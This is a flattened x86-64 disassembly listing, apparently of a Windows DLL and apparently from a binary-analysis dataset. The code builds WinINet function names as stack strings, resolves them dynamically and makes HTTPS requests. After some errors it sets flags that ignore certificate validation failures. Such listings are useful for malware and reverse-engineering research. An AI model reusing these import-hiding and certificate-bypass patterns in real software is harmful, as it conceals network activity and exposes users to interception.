mov [ rbp + 0x168 ] 0x4f746553
mov [ rbp + 0x16c ] 0x6f697470
mov [ rbp + 0x170 ] 0x576e
mov [ rbp + 0x172 ] 0x0
lea rdx [ rbp + 0x160 ]
mov rcx rbx
call [ GetProcAddress@IAT ]
mov [ rbp - 0x78 ] rax
mov [ rbp + 0x178 ] 0x65746e49
mov [ rbp + 0x17c ] 0x74656e72
mov [ rbp + 0x180 ] 0x736f6c43
mov [ rbp + 0x184 ] 0x6e614865
mov [ rbp + 0x188 ] 0x656c64
lea rdx [ rbp + 0x178 ]
mov rcx rbx
call [ GetProcAddress@IAT ]
mov r12 rax
mov [ rbp + 0xd8 ] 0x70747448
mov [ rbp + 0xdc ] 0x72657551
mov [ rbp + 0xe0 ] 0x666e4979
mov [ rbp + 0xe4 ] 0x576f
mov [ rbp + 0xe6 ] 0x0
lea rdx [ rbp + 0xd8 ]
mov rcx rbx
call [ GetProcAddress@IAT ]
mov [ rsp + 0x68 ] rax
mov [ rbp + 0x100 ] 0x70747448
mov [ rbp + 0x104 ] 0x646e6553
mov [ rbp + 0x108 ] 0x75716552
mov [ rbp + 0x10c ] 0x57747365
mov [ rbp + 0x110 ] 0x0
lea rdx [ rbp + 0x100 ]
mov rcx rbx
call [ GetProcAddress@IAT ]
mov [ rsp + 0x78 ] rax
mov [ rbp + 0x1a8 ] 0x65746e49
mov [ rbp + 0x1ac ] 0x74656e72
mov [ rbp + 0x1b0 ] 0x72657551
mov [ rbp + 0x1b4 ] 0x74614479
mov [ rbp + 0x1b8 ] 0x61764161
mov [ rbp + 0x1bc ] 0x62616c69
mov [ rbp + 0x1c0 ] 0x656c
mov [ rbp + 0x1c2 ] 0x0
lea rdx [ rbp + 0x1a8 ]
mov rcx rbx
call [ GetProcAddress@IAT ]
mov r15 rax
mov [ rbp - 0x70 ] rax
mov [ rbp + 0xc8 ] 0x65746e49
mov [ rbp + 0xcc ] 0x74656e72
mov [ rbp + 0xd0 ] 0x6e65704f
mov [ rbp + 0xd4 ] 0x57
lea rdx [ rbp + 0xc8 ]
mov rcx rbx
call [ GetProcAddress@IAT ]
mov r14 rax
mov [ rbp + 0x130 ] 0x65746e49
mov [ rbp + 0x134 ] 0x74656e72
mov [ rbp + 0x138 ] 0x6e6e6f43
mov [ rbp + 0x13c ] 0x57746365
mov [ rbp + 0x140 ] 0x0
lea rdx [ rbp + 0x130 ]
mov rcx rbx
call [ GetProcAddress@IAT ]
mov [ rsp + 0x50 ] rax
mov [ rbp + 0xe8 ] 0x70747448
mov [ rbp + 0xec ] 0x6e65704f
mov [ rbp + 0xf0 ] 0x75716552
mov [ rbp + 0xf4 ] 0x41747365
mov [ rbp + 0xf8 ] 0x0
lea rdx [ rbp + 0xe8 ]
mov rcx rbx
call [ GetProcAddress@IAT ]
mov [ rsp + 0x58 ] rax
mov [ rbp + 0x118 ] 0x65746e49
mov [ rbp + 0x11c ] 0x74656e72
mov [ rbp + 0x120 ] 0x64616552
mov [ rbp + 0x124 ] 0x656c6946
mov [ rbp + 0x128 ] 0x0
lea rdx [ rbp + 0x118 ]
mov rcx rbx
call [ GetProcAddress@IAT ]
mov [ rsp + 0x60 ] rax
mov [ rbp + 0x148 ] 0x65746e49
mov [ rbp + 0x14c ] 0x74656e72
mov [ rbp + 0x150 ] 0x63617243
mov [ rbp + 0x154 ] 0x6c72556b
mov [ rbp + 0x158 ] 0x57
lea rdx [ rbp + 0x148 ]
mov rcx rbx
call [ GetProcAddress@IAT ]
mov r13 rax
cmp [ rsp + 0x70 ] 0x0
je r-xdata
lea rcx [ rbp + 0xb8 ]
call [ LoadLibraryA@IAT ]
mov rbx rax
test rax rax
je r-xdata
cmp [ rbp - 0x78 ] 0x0
je r-xdata
test r12 r12
je r-xdata
cmp [ rsp + 0x68 ] 0x0
je r-xdata
cmp [ rsp + 0x78 ] 0x0
je r-xdata
test r15 r15
je r-xdata
test r14 r14
je r-xdata
cmp [ rsp + 0x50 ] 0x0
je r-xdata
cmp [ rsp + 0x58 ] 0x0
je r-xdata
cmp [ rsp + 0x60 ] 0x0
je r-xdata
test rax rax
je r-xdata
mov rcx rdi
call sub_180014270
test al al
je r-xdata
xor eax eax
mov [ rbp - 0x80 ] rax
mov [ rsp + 0x48 ] eax
mov rcx [ rdi + 0xc8 ]
mov rax [ rcx ]
mov r8 rsi
lea rdx [ rbp + 0x40 ]
call [ rax + 0x10 ]
nop
mov [ rdi + 0x40 ] 0x0
mov rax [ rdi + 0x120 ]
cmp [ rdi + 0x118 ] rax
je r-xdata
mov dl 0x1
mov rcx rdi
call sub_180015ef0
xor edx edx
lea r8d [ rdx + 0x60 ]
lea rcx [ rbp - 0x58 ]
call sub_18001c9f0
mov [ rbp - 0x60 ] 0x68
mov [ rbp - 0x40 ] 0x1
mov [ rbp - 0x30 ] 0x1
mov [ rbp - 0x20 ] 0x1
mov [ rbp - 0x10 ] 0x1
lea rbx [ rdi + 0x10 ]
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov [ rdi + 0x40 ] 0x1
mov rcx rbx
mov rcx [ rbx ]
jmp r-xdata
movzx eax [ rdi + 0x40 ]
xor r13d r13d
test al al
je r-xdata
lea r8 [ rdi + 0x118 ]
mov edx [ rbp - 0x4c ]
mov rcx rdi
call sub_180017e90
lea r9 [ rbp - 0x60 ]
xor r8d r8d
mov edx [ rdi + 0x20 ]
call r13
cmp [ rdi + 0x40 ] 0x0
je r-xdata
mov r8 r13
lea r8 [ rdi + 0x48 ]
cmp [ r8 + 0x18 ] 0x8
jb r-xdata
cmp [ rbp - 0x4c ] 0x0
jne r-xdata
mov [ rdi + 0xc4 ] al
jmp r-xdata
neg al
sbb edx edx
and edx 0x3
mov [ rsp + 0x20 ] r13d
xor r9d r9d
lea rcx [ r--data ]
call r14
mov r15 rax
test rax rax
jne r-xdata
mov r8 [ r8 ]
jmp r-xdata
mov eax [ rbp - 0x40 ]
mov rbx [ rbp - 0x48 ]
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
cmp [ rbp + 0x58 ] 0x10
jb r-xdata
mov [ rbp + 0x80 ] 0x7
mov [ rbp + 0x78 ] r13
mov [ rbp + 0x68 ] r13w
test r14 r14
jne r-xdata
mov rcx [ rbp + 0x68 ]
call j_sub_18001c80c
mov [ rbp - 0x48 ] rbx
mov rax [ rdi + 0x20 ]
mov [ rbp - 0x40 ] eax
mov [ rbp - 0x4c ] 0x4
mov ecx 0x1bb
mov [ rbp - 0x3c ] cx
jmp r-xdata
mov rbx [ rbx ]
mov rcx [ rbp + 0x40 ]
call j_sub_18001c80c
cmp [ rdi + 0x40 ] 0x0
je r-xdata
mov [ rdi + 0xc4 ] r14b
mov rcx r15
call r12
nop
jmp r-xdata
mov r8d eax
mov [ rbp + 0x80 ] 0x7
mov [ rbp + 0x78 ] r13
mov [ rbp + 0x68 ] r13w
mov rdx rbx
lea rcx [ rbp + 0x68 ]
call sub_180003b50
nop
lea rdx [ rbp + 0x68 ]
cmp [ rbp + 0x80 ] 0x8
cmovae rdx [ rbp + 0x68 ]
mov [ rsp + 0x38 ] r13
mov [ rsp + 0x30 ] r13d
mov [ rsp + 0x28 ] 0x3
mov [ rsp + 0x20 ] r13
xor r9d r9d
movzx r8d [ rbp - 0x3c ]
mov rcx r15
call [ rsp + 0x50 ]
mov r14 rax
cmp [ rbp + 0x80 ] 0x8
jb r-xdata
mov esi r13d
mov eax 0x800000
cmp [ rbp - 0x4c ] 0x4
cmove esi eax
mov ecx 0x30
call sub_18001c84c
mov [ rsp + 0x50 ] rax
test rax rax
je r-xdata
lea rax [ rbp + 0x90 ]
mov [ rsp + 0x50 ] rax
lea rdx [ rdi + 0x98 ]
lea rcx [ rbp + 0x90 ]
call sub_1800020a0
mov rbx rax
lea rdx [ rdi + 0x70 ]
lea rcx [ rbp + 0x18 ]
call sub_1800020a0
nop
mov r9 rbx
mov r8 rax
mov rdx r14
mov rcx rdi
call sub_180014d00
test al al
jne r-xdata
mov rbx r13
mov rcx rax
call sub_180008850
mov rbx rax
jmp r-xdata
mov rcx r15
call r12
mov rcx r14
call r12
nop
jmp r-xdata
lea r8 [ rbp + 0x40 ]
cmp [ rbp + 0x58 ] 0x10
cmovae r8 [ rbp + 0x40 ]
mov [ rsp + 0x38 ] r13
mov [ rsp + 0x30 ] esi
mov [ rsp + 0x28 ] r13
mov [ rsp + 0x20 ] r13
mov r9 rax
xor edx edx
mov rcx r14
call [ rsp + 0x58 ]
mov rsi rax
cmp [ rbp + 0xa8 ] 0x10
jb r-xdata
mov rax [ rax ]
mov r8d 0xb
lea rdx [ rw-data ]
mov rcx rbx
call sub_1800088d0
mov r8d 0x9
lea rdx [ rw-data ]
mov rcx rbx
call sub_1800088c0
lea rdx [ rbp + 0x90 ]
mov rcx rbx
call sub_180009450
nop
cmp [ rax + 0x18 ] 0x10
jb r-xdata
mov [ rbp + 0xa8 ] 0xf
mov [ rbp + 0xa0 ] r13
mov [ rbp + 0x90 ] 0x0
test rbx rbx
je r-xdata
mov rcx [ rbp + 0x90 ]
call j_sub_18001c80c
test rsi rsi
jne r-xdata
mov rcx rbx
call sub_180008890
mov rcx rbx
call j_sub_18001c80c
mov rcx [ rdi + 0xc8 ]
mov rax [ rcx ]
mov rdx rsi
call [ rax + 0x8 ]
cmp [ rbp - 0x4c ] 0x4
jne r-xdata
mov [ rdi + 0xc4 ] sil
mov rcx r15
call r12
mov rcx r14
call r12
nop
jmp r-xdata
mov [ rsp + 0x20 ] r13d
xor r9d r9d
xor r8d r8d
xor edx edx
mov rcx rsi
call [ rsp + 0x78 ]
test eax eax
je r-xdata
mov [ rsp + 0x40 ] r13d
mov [ rsp + 0x44 ] 0x4
lea r9 [ rsp + 0x44 ]
lea r8 [ rsp + 0x40 ]
mov edx 0x1f
mov rcx rsi
call [ rsp + 0x70 ]
test eax eax
je r-xdata
mov [ rdi + 0xc4 ] 0x0
xor edx edx
mov rcx rdi
call sub_180015ef0
mov [ rsp + 0x40 ] r13d
mov [ rsp + 0x20 ] r13
lea r9 [ rsp + 0x40 ]
xor r8d r8d
lea edx [ r8 + 0x15 ]
mov rcx rsi
mov r13 [ rsp + 0x68 ]
call r13
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
or [ rsp + 0x40 ] 0x3100
mov r9d [ rsp + 0x44 ]
lea r8 [ rsp + 0x40 ]
mov edx 0x1f
mov rcx rsi
call [ rbp - 0x78 ]
cmp [ rsp + 0x48 ] 0x4
jb r-xdata
mov [ rdi + 0xc4 ] 0x1
xor r13d r13d
jmp r-xdata
mov ecx [ rsp + 0x40 ]
lea edx [ rax - 0x79 ]
call sub_18001d210
mov rbx rax
mov [ rsp + 0x20 ] 0x0
lea r9 [ rsp + 0x40 ]
mov r8 rax
mov edx 0x13
mov rcx rsi
call r13
lea rcx [ r--data ]
mov eax [ rbx ]
cmp eax [ rcx ]
jne r-xdata
mov ecx 0x10
call sub_18001c84c
mov rbx rax
test rax rax
je r-xdata
mov rcx r15
call r12
mov rcx r14
call r12
mov rcx rsi
call r12
mov rdi [ rbp - 0x80 ]
test rdi rdi
je r-xdata
sbb eax eax
sbb eax 0xffffffff
movzx eax [ rbx + 0x4 ]
cmp ax [ rcx + 0x4 ]
jne r-xdata
mov rbx r13
mov eax [ rsp + 0x48 ]
mov [ rbx ] rdi
mov [ rbx + 0x8 ] rax
jmp r-xdata
call sub_18001c80c
mov [ rsp + 0x50 ] 0x4
mov [ rsp + 0x20 ] 0x0
lea r9 [ rsp + 0x50 ]
lea r8 [ rsp + 0x40 ]
mov edx 0x20000005
mov rcx rsi
call r13
test eax eax
je r-xdata
mov [ rdi + 0xc4 ] 0x1
call sub_18001c80c
mov rcx r15
call r12
mov rcx r14
call r12
mov rcx rsi
call r12
nop
jmp r-xdata
xor eax eax
jmp r-xdata
mov rax rbx
jmp r-xdata
mov rcx [ rbp + 0x40 ]
call j_sub_18001c80c
cmp [ rbp + 0x58 ] 0x10
jb r-xdata
mov eax [ rsp + 0x40 ]
cmp eax 0x7
jbe r-xdata
mov rcx rbx
test eax eax
je r-xdata
mov rcx [ rbp + 0x1c8 ]
xor rcx rsp
call sub_18001d1f0
mov rbx [ rsp + 0x320 ]
add rsp 0x2d0
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
xor ecx ecx
mov ebx ecx
mov [ rsp + 0x58 ] ecx
mov [ rsp + 0x44 ] ecx
mov ecx eax
mov edx 0x1
call sub_18001d210
mov r13 rax
test rax rax
je r-xdata
nop [ rax + rax ] ax
mov r8d [ rsp + 0x40 ]
mov edx ebx
add rdx r13
lea r9 [ rsp + 0x58 ]
mov rcx rsi
call [ rsp + 0x60 ]
test eax eax
je r-xdata
add ebx [ rsp + 0x58 ]
mov r8d [ rsp + 0x40 ]
cmp ebx r8d
jb r-xdata
xor r9d r9d
xor r8d r8d
lea rdx [ rsp + 0x44 ]
mov rcx rsi
call [ rbp - 0x70 ]
mov r8d [ rsp + 0x44 ]
test r8d r8d
je r-xdata
jmp r-xdata
mov rcx [ rdi + 0xc8 ]
mov r10 [ rcx ]
mov eax [ rw-data ]
sub r8d eax
lea rdx [ r13 + rax ]
lea r9 [ rsp + 0x48 ]
call [ r10 + 0x20 ]
mov [ rbp - 0x80 ] rax
mov rcx r13
call sub_18001c80c
sub_180019230
push rbp
push rsi
push rdi
push r12
push r13
lea rbp [ rsp - 0x37 ]
sub rsp 0xf0
mov [ rsp + 0x30 ] 0xfffffffffffffffe
mov [ rsp + 0x138 ] rbx
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x27 ] rax
mov rsi rdx
mov rdi rcx
mov [ rsp + 0x28 ] rcx
xor r13d r13d
mov [ rsp + 0x20 ] r13d
mov [ rcx ] r13
mov [ rcx + 0x8 ] r13
mov [ rcx + 0x10 ] r13
mov [ rsp + 0x20 ] 0x1
mov rbx [ rdx ]
cmp rbx [ rdx + 0x8 ]
je r-xdata
mov rax rdi
mov rcx [ rbp + 0x27 ]
xor rcx rsp
call sub_18001d1f0
mov rbx [ rsp + 0x138 ]
add rsp 0xf0
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov r12d r8d
nop [ rax ] eax
mov [ rbp + 0x17 ] 0x7
mov [ rbp + 0xf ] r13
mov [ rbp - 0x1 ] r13w
cmp [ rbp - 0x11 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x1 ]
call j_sub_18001c80c
cmp [ rbp - 0x69 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x29 ]
call j_sub_18001c80c
nop
mov [ rbp - 0x69 ] 0x7
mov [ rbp - 0x71 ] r13
mov [ rsp + 0x38 ] r13w
cmp [ rbp - 0x41 ] 0x8
jb r-xdata
mov rcx [ rsp + 0x38 ]
call j_sub_18001c80c
add rbx 0x28
cmp rbx [ rsi + 0x8 ]
jne r-xdata
mov rcx [ rbp - 0x59 ]
call j_sub_18001c80c
mov r9 r12
xor r8d r8d
lea rdx [ rbp - 0x59 ]
mov rcx rbx
call sub_180014c20
nop
or r9 0xffffffffffffffff
mov r8 r12
lea rdx [ rsp + 0x38 ]
mov rcx rbx
call sub_180014c20
nop
lea r8 [ rsp + 0x38 ]
lea rdx [ rbp - 0x59 ]
lea rcx [ rbp - 0x29 ]
call sub_180015450
nop
mov rdx rax
mov rcx rdi
call sub_180016ff0
nop
cmp [ rbp + 0x17 ] 0x8
jb r-xdata
sub_180019390
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
lea rbp [ rsp - 0xa0 ]
sub rsp 0x1a0
mov [ rsp + 0x68 ] 0xfffffffffffffffe
mov [ rsp + 0x1f0 ] rbx
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x90 ] rax
mov rbx rdx
mov r13 rcx
mov [ rbp + 0x30 ] 0x7
xor r14d r14d
mov [ rbp + 0x28 ] r14
mov [ rbp + 0x18 ] r14w
mov [ rbp - 0x20 ] 0x7
mov [ rbp - 0x28 ] r14
mov [ rbp - 0x38 ] r14w
xor r12b r12b
mov [ rbp + 0x8 ] 0x7
mov [ rbp ] r14
mov [ rbp - 0x10 ] r14w
xor eax eax
or r15 0xffffffffffffffff
mov rcx r15
mov rdx [ rw-data ]
mov rdi rdx
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
lea rcx [ rbp - 0x10 ]
call sub_180003b50
nop
lea r8 [ rbp - 0x10 ]
mov rdx rbx
lea rcx [ rsp + 0x48 ]
call sub_1800170c0
nop
cmp [ rbp + 0x8 ] 0x8
jb r-xdata
mov [ rbp + 0x8 ] 0x7
mov [ rbp ] r14
mov [ rbp - 0x10 ] r14w
mov r8d [ rw-data ]
lea rdx [ rsp + 0x48 ]
lea rcx [ rsp + 0x28 ]
call sub_180019230
nop
xor eax eax
movzx r8d al
mov rdx [ rsp + 0x30 ]
mov rcx [ rsp + 0x28 ]
call sub_1800143a0
mov r11 [ rsp + 0x30 ]
cmp rax r11
je r-xdata
mov rcx [ rbp - 0x10 ]
call j_sub_18001c80c
mov rcx [ rsp + 0x28 ]
test rcx rcx
je r-xdata
lea r10 [ rax + 0x28 ]
xor eax eax
mov rcx r15
lea r8 [ rw-data ]
mov rdi r8
[ rdi ]
not rcx
lea r9 [ rcx - 0x1 ]
mov rdi [ r10 + 0x10 ]
cmp rdi rdi
cmp [ r10 + 0x18 ] 0x8
jb r-xdata
mov [ rsp + 0x28 ] r14
mov [ rsp + 0x30 ] r14
mov [ rsp + 0x38 ] r14
mov rdi [ rsp + 0x48 ]
test rdi rdi
je r-xdata
movzx r9d [ rsp + 0x20 ]
lea r8 [ rsp + 0x40 ]
mov rdx r11
call sub_180015870
mov rcx [ rsp + 0x28 ]
call j_sub_18001c80c
mov rdx r10
mov rdx [ r10 ]
jmp r-xdata
mov [ rsp + 0x48 ] r14
mov [ rsp + 0x50 ] r14
mov [ rsp + 0x58 ] r14
cmp [ rbp - 0x20 ] 0x8
jb r-xdata
mov rbx [ rsp + 0x50 ]
cmp rdi rbx
je r-xdata
mov ecx r14d
movzx eax [ r8 ]
cmp [ rdx ] ax
jne r-xdata
dec rcx
cmp rdi r9
cmovb rcx rdi
mov esi 0x1
test rcx rcx
je r-xdata
mov [ rbp - 0x20 ] 0x7
mov [ rbp - 0x28 ] r14
mov [ rbp - 0x38 ] r14w
mov rcx [ rbp - 0x38 ]
call j_sub_18001c80c
mov rcx rdi
call j_sub_18001c80c
cmp [ rdi + 0x18 ] 0x8
jb r-xdata
test eax eax
sete al
test al al
sete al
lea rbx [ rw-data ]
test al al
je r-xdata
cmp rdi r9
jae r-xdata
mov ecx esi
cmp [ rdx ] ax
cmovb ecx r15d
jmp r-xdata
add rdx 0x2
add r8 0x2
dec rcx
jne r-xdata
xor al al
mov rcx [ rbp + 0x18 ]
call j_sub_18001c80c
mov [ rdi + 0x18 ] 0x7
mov [ rdi + 0x10 ] r14
mov [ rdi ] r14w
add rdi 0x28
cmp rdi rbx
jne r-xdata
mov rcx [ rdi ]
call j_sub_18001c80c
mov r9 r15
xor r8d r8d
mov rdx r10
lea rcx [ rbp + 0x18 ]
call sub_180001ac0
xor edx edx
movzx r8d dl
mov rdx [ rsp + 0x30 ]
mov rcx [ rsp + 0x28 ]
call sub_180014470
mov rdx [ rsp + 0x30 ]
cmp rax rdx
jne r-xdata
xor eax eax
mov rcx r15
mov rdi rbx
[ rdi ]
not rcx
dec rcx
mov r9 rcx
mov r8 [ r10 + 0x10 ]
cmp r8 r8
cmp [ r10 + 0x18 ] 0x8
jb r-xdata
mov eax r14d
cmp rdi r9
setne al
mov eax r15d
jmp r-xdata
movsxd rax ecx
test ecx ecx
jne r-xdata
jmp r-xdata
mov rdi [ rsp + 0x48 ]
lea rdx [ rax + 0x28 ]
mov r9 r15
xor r8d r8d
lea rcx [ rbp - 0x38 ]
call sub_180001ac0
mov [ rbp - 0x48 ] 0x7
mov [ rbp - 0x50 ] r14
mov [ rbp - 0x60 ] r14w
xor r8d r8d
lea rdx [ r--data ]
lea rcx [ rbp - 0x60 ]
call sub_180003b50
nop
lea rcx [ rsp + 0x70 ]
call sub_180008850
nop
mov r8d 0xb
lea rdx [ rw-data ]
lea rcx [ rsp + 0x70 ]
call sub_1800088d0
xor eax eax
mov rcx r15
mov rdi rbx
[ rdi ]
not rcx
lea rdi [ rcx - 0x1 ]
lea rdx [ rbp + 0x18 ]
cmp [ rbp + 0x30 ] 0x8
cmovae rdx [ rbp + 0x18 ]
dec rcx
mov r8 [ rbp + 0x28 ]
cmp r8 rdi
cmovb rcx r8
test rcx rcx
je r-xdata
xor eax eax
movzx r8d al
mov rcx [ rsp + 0x28 ]
call sub_180014540
mov rdx [ rsp + 0x30 ]
cmp rax rdx
jne r-xdata
mov rdx r10
mov rdx [ r10 ]
jmp r-xdata
mov esi r14d
nop [ rax + rax ] eax
movzx r12d sil
mov rcx [ rsp + 0x28 ]
test rcx rcx
je r-xdata
mov edi r14d
nop [ rax ] eax
mov rdi rcx
cmp r8 rcx
cmovb rdi r8
mov rcx rbx
test rdi rdi
je r-xdata
test eax eax
sete al
lea rcx [ rsp + 0x70 ]
test al al
je r-xdata
cmp r8 rdi
jae r-xdata
cmovb esi r15d
jmp r-xdata
add rdx 0x2
add rbx 0x2
dec rcx
jne r-xdata
mov [ rsp + 0x28 ] r14
mov [ rsp + 0x30 ] r14
mov [ rsp + 0x38 ] r14
mov rdi [ rsp + 0x48 ]
test rdi rdi
je r-xdata
movzx r9d [ rsp + 0x20 ]
lea r8 [ rsp + 0x40 ]
call sub_180015870
mov rcx [ rsp + 0x28 ]
call j_sub_18001c80c
test eax eax
sete al
test al al
sete al
test al al
jne r-xdata
cmp r8 r9
jae r-xdata
mov edi esi
cmp [ rdx ] ax
cmovb edi r15d
jmp r-xdata
add rdx 0x2
add rcx 0x2
dec rdi
jne r-xdata
mov r8d 0x10
lea rdx [ rw-data ]
mov r8d 0x12
lea rdx [ rw-data ]
jmp r-xdata
mov eax r14d
cmp r8 rdi
setne al
mov eax r15d
jmp r-xdata
movsxd rax esi
test esi esi
jne r-xdata
movzx eax [ rbx ]
cmp [ rdx ] ax
jne r-xdata
jmp r-xdata
mov [ rsp + 0x48 ] r14
mov [ rsp + 0x50 ] r14
mov [ rsp + 0x58 ] r14
cmp [ rbp - 0x20 ] 0x8
jb r-xdata
mov rbx [ rsp + 0x50 ]
cmp rdi rbx
je r-xdata
mov eax r14d
cmp r8 r9
setne al
mov eax r15d
jmp r-xdata
movsxd rax edi
test edi edi
jne r-xdata
movzx eax [ rcx ]
cmp [ rdx ] ax
jne r-xdata
jmp r-xdata
cmp [ rbp + 0x58 ] 0x8
jb r-xdata
cmp [ rbp - 0x48 ] 0x8
jb r-xdata
call sub_1800088c0
lea rdx [ rbp + 0x40 ]
lea rcx [ rsp + 0x70 ]
call sub_1800092e0
mov rdi rax
lea rax [ rbp - 0x60 ]
cmp rax rdi
je r-xdata
mov [ rbp - 0x20 ] 0x7
mov [ rbp - 0x28 ] r14
mov [ rbp - 0x38 ] r14w
jmp r-xdata
mov rcx [ rbp - 0x38 ]
call j_sub_18001c80c
mov rcx rdi
call j_sub_18001c80c
nop [ rax + rax ] eax
test r12b r12b
je r-xdata
mov rcx [ rbp + 0x40 ]
call j_sub_18001c80c
mov [ rbp - 0x48 ] 0x7
mov [ rbp - 0x50 ] r14
mov [ rbp - 0x60 ] r14w
cmp [ rdi + 0x18 ] 0x8
jae r-xdata
mov rcx [ rbp - 0x60 ]
call j_sub_18001c80c
cmp [ rbp + 0x30 ] 0x8
jb r-xdata
mov [ rdi + 0x18 ] 0x7
mov [ rdi + 0x10 ] r14
mov [ rdi ] r14w
add rdi 0x28
cmp rdi rbx
jne r-xdata
mov rcx [ rdi ]
call j_sub_18001c80c
mov r9 r15
xor r8d r8d
lea rdx [ rbp - 0x38 ]
lea rcx [ rbp - 0x60 ]
call sub_18000c2e0
xor ecx ecx
movzx r8d cl
mov rdx [ rsp + 0x30 ]
mov rcx [ rsp + 0x28 ]
call sub_1800147b0
cmp rax [ rsp + 0x30 ]
je r-xdata
xor eax eax
movzx r8d al
mov rdx [ rsp + 0x30 ]
mov rcx [ rsp + 0x28 ]
call sub_180014610
mov rbx rax
xor eax eax
movzx r8d al
mov rdx [ rsp + 0x30 ]
mov rcx [ rsp + 0x28 ]
call sub_1800146e0
mov rdi rax
mov rax [ rsp + 0x30 ]
cmp rbx rax
je r-xdata
mov rax [ rdi ]
mov [ rbp - 0x60 ] rax
mov [ rdi ] r14
mov r8 [ rdi + 0x10 ]
inc r8
add r8 r8
mov rdx rdi
lea rcx [ rbp - 0x60 ]
call sub_18001c4a0
jmp r-xdata
cmp [ rdi + 0x18 ] 0x8
jb r-xdata
mov rdi [ rsp + 0x48 ]
lea rdx [ rbp - 0x60 ]
test r12b r12b
lea rcx [ r13 + 0x118 ]
jne r-xdata
lea r8 [ rax + 0x28 ]
lea rdx [ r--data ]
lea rcx [ rbp + 0x68 ]
call sub_180015290
nop
mov r9 r15
xor r8d r8d
mov rdx rax
lea rcx [ rbp - 0x60 ]
call sub_18000c2e0
nop
cmp [ rbp + 0x80 ] 0x8
jb r-xdata
cmp rdi rax
je r-xdata
mov rax [ rdi + 0x10 ]
mov [ rbp - 0x50 ] rax
mov rax [ rdi + 0x18 ]
mov [ rbp - 0x48 ] rax
mov [ rdi + 0x18 ] 0x7
mov [ rdi + 0x10 ] r14
mov [ rdi ] r14w
call sub_180009dd0
nop
lea rcx [ rsp + 0x70 ]
call sub_180008890
nop
cmp [ rbp - 0x48 ] 0x8
jb r-xdata
lea rcx [ r13 + 0xf8 ]
mov rcx [ rbp + 0x68 ]
call j_sub_18001c80c
lea rdx [ rbx + 0x28 ]
lea r8 [ r--data ]
lea rcx [ rbp + 0x68 ]
call sub_1800151b0
nop
lea r8 [ rdi + 0x28 ]
mov rdx rax
lea rcx [ rbp + 0x40 ]
call sub_18000c760
nop
lea r8 [ r--data ]
mov rdx rax
lea rcx [ rbp - 0x10 ]
call sub_1800116b0
nop
mov r9 r15
xor r8d r8d
mov rdx rax
lea rcx [ rbp - 0x60 ]
call sub_18000c2e0
nop
cmp [ rbp + 0x8 ] 0x8
jb r-xdata
mov [ rbp - 0x48 ] 0x7
mov [ rbp - 0x50 ] r14
mov [ rbp - 0x60 ] r14w
mov rcx [ rsp + 0x28 ]
test rcx rcx
je r-xdata
mov rcx [ rbp - 0x60 ]
call j_sub_18001c80c
mov [ rbp + 0x8 ] 0x7
mov [ rbp ] r14
mov [ rbp - 0x10 ] r14w
cmp [ rbp + 0x58 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x10 ]
call j_sub_18001c80c
mov [ rsp + 0x28 ] r14
mov [ rsp + 0x30 ] r14
mov [ rsp + 0x38 ] r14
mov rdi [ rsp + 0x48 ]
test rdi rdi
je r-xdata
movzx r9d [ rsp + 0x20 ]
lea r8 [ rsp + 0x40 ]
mov rdx [ rsp + 0x30 ]
call sub_180015870
mov rcx [ rsp + 0x28 ]
call j_sub_18001c80c
mov [ rbp + 0x58 ] 0x7
mov [ rbp + 0x50 ] r14
mov [ rbp + 0x40 ] r14w
cmp [ rbp + 0x80 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x40 ]
call j_sub_18001c80c
mov [ rsp + 0x48 ] r14
mov [ rsp + 0x50 ] r14
mov [ rsp + 0x58 ] r14
cmp [ rbp - 0x20 ] 0x8
jb r-xdata
mov rbx [ rsp + 0x50 ]
cmp rdi rbx
je r-xdata
mov rcx [ rbp + 0x68 ]
call j_sub_18001c80c
mov [ rbp - 0x20 ] 0x7
mov [ rbp - 0x28 ] r14
mov [ rbp - 0x38 ] r14w
cmp [ rbp + 0x30 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x38 ]
call j_sub_18001c80c
mov rcx rdi
call j_sub_18001c80c
nop
mov al 0x1
jmp r-xdata
mov rcx [ rbp + 0x18 ]
call j_sub_18001c80c
mov [ rdi + 0x18 ] 0x7
mov [ rdi + 0x10 ] r14
mov [ rdi ] r14w
add rdi 0x28
cmp rdi rbx
jne r-xdata
mov rcx [ rdi ]
call j_sub_18001c80c
mov rcx [ rbp + 0x90 ]
xor rcx rsp
call sub_18001d1f0
mov rbx [ rsp + 0x1f0 ]
add rsp 0x1a0
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
cmp [ rdi + 0x18 ] 0x8
jb r-xdata
mov rdi [ rsp + 0x48 ]
sub_180019bd0
push r12
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x40 ] rbx
mov [ rsp + 0x50 ] rsi
mov [ rsp + 0x58 ] rdi
mov rsi rdx
mov r12 rcx
mov rbx [ rdx ]
cmp rbx [ rdx + 0x8 ]
jne r-xdata
mov dil 0x1
mov [ rsp + 0x48 ] dil
nop [ rax ] eax
xor al al
jmp r-xdata
movzx eax dil
mov rdx rbx
mov rcx r12
call sub_180019390
test al al
jne r-xdata
mov rbx [ rsp + 0x40 ]
mov rsi [ rsp + 0x50 ]
mov rdi [ rsp + 0x58 ]
add rsp 0x30
pop r12
retn
add rbx 0x28
jmp r-xdata
xor dil dil
mov [ rsp + 0x48 ] dil
jmp r-xdata
cmp rbx [ rsi + 0x8 ]
je r-xdata
sub_180019c60
mov [ rsp + 0x10 ] rdx
push rbp
push rsi
push rdi
push r12
push r13
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x70 ] rbx
mov rdi rdx
mov rbp rcx
movzx eax [ rdx + 0x2 ]
mov [ rcx + 0xd2 ] al
movzx eax [ rdx ]
mov [ rcx + 0xd0 ] ax
movzx eax [ rdx + 0x3 ]
mov [ rcx + 0xd3 ] al
